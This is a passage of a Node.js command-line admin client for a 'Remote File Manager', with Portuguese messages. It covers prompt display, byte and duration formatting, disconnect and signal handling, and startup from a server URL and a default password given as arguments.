      clientInfo = chalk.yellow(` → Client ${this.selectedClient}`) + chalk.magenta(` ${currentPath}`);
    } else {
      clientInfo = chalk.gray(' → Broadcast');
    }

    this.rl.setPrompt(`${status} [${adminInfo}${clientInfo}] > `);
    this.rl.prompt();
  }

  formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  }

  formatDuration(ms) {
    const seconds = Math.floor(ms / 1000);
    const minutes = Math.floor(seconds / 60);
    const hours = Math.floor(minutes / 60);

    if (hours > 0) return `${hours}h ${minutes % 60}m`;
    if (minutes > 0) return `${minutes}m ${seconds % 60}s`;
    return `${seconds}s`;
  }

  disconnect() {
    console.log(chalk.yellow('\n👋 Desconectando...'));

    this.isConnected = false;
    this.adminId = null;
    
    if (this.statusInterval) {
      clearInterval(this.statusInterval);
      this.statusInterval = null;
    }

    if (this.rl) {
      this.rl.close();
    }

    console.log(chalk.green('✅ Desconectado com sucesso!'));
    process.exit(0);
  }
}

// Capturar sinais de encerramento
process.on('SIGINT', () => {
  console.log(chalk.yellow('\n\n⚡ Recebido SIGINT (Ctrl+C)'));
  if (global.adminClient) {
    global.adminClient.disconnect();
  } else {
    process.exit(0);
  }
});

// Iniciar o cliente admin
const args = process.argv.slice(2);
const serverUrl = args[0] || 'http://localhost:8080';
const password = args[1] || 'admin123';

try {
  console.clear();
  console.log(chalk.green.bold('╔════════════════════════════════════════╗'));
  console.log(chalk.green.bold('║   REMOTE FILE MANAGER - ADMIN CLIENT   ║'));
  console.log(chalk.green.bold('╚════════════════════════════════════════╝'));
  console.log(chalk.cyan(`\n🔗 Servidor: ${serverUrl}`));
  console.log(chalk.gray(`🔐 Senha: ${'*'.repeat(password.length)}\n`));

  global.adminClient = new AdminClient(serverUrl, password);

} catch (error) {
  console.error(chalk.red('❌ Erro ao iniciar cliente admin:'), error.message);
  process.exit(1);
}